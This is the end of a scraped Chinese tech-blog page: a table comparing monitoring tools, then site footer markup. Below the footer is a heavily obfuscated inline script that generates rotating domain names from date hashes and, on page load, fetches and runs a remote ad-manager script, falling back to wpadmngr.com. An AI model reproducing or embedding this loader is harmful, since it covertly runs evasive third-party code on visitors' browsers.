<td style="width:70.85pt"> <p style="margin-left:.0001pt;text-align:left"><span style="background-color:#ffffff"><span style="color:#767171">3.2</span></span><span style="background-color:#ffffff"><span style="color:#767171">版本之前BUG较多 ；版本升级架构变化较大。</span></span></p> </td>
<td style="width:96.1pt"> <p style="margin-left:.0001pt;text-align:left"><span style="background-color:#ffffff"><span style="color:#767171">代码侵入性较强，需要埋点；</span></span></p> <p style="margin-left:.0001pt;text-align:left"><span style="background-color:#ffffff"><span style="color:#767171">文档比较混乱，文档与发布版本的符合性较低；</span></span></p> <p style="margin-left:.0001pt;text-align:left"><span style="background-color:#ffffff"><span style="color:#767171">需要依赖大众点评私服。</span></span></p> </td>
</tr>
</tbody></table>
<h1 style="margin-left:0cm"></h1>
                </div>

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>